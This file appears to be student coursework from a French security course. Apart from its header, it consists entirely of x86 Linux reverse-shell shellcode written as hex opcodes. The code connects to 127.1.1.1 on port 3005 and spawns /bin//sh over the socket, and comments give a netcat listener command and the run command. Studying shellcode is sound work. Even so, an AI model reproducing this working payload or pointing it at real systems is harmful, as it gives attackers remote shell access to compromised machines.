# NOM / Prénom : NEHME Ali - MEZANI Nazim
# REVERSE SHELL ASM
# M1 - Sécurité - GR3
# ESGI
#

# nc -l -p 3005 -s 127.1.1.1
# m2elf --in simple-shellcode.m --out simple-shellcode && ./simple-shellcode

68 7f 01 01 01
66 68 0b bd 
29 c0 
66 b8 67 01 
31 d2 
89 d1 
41
89 cb 
43
66 53 
cd 80 
89 c3 
66 b8 6a 01 
89 e1 
b2 10 
cd 80 
50
68 6e 2f 73 68
68 2f 2f 62 69
04 03
89 c1 
b0 3f 
49
cd 80 
75 f9 
89 c8 
b2 0b 
92
89 e3 
cd 80 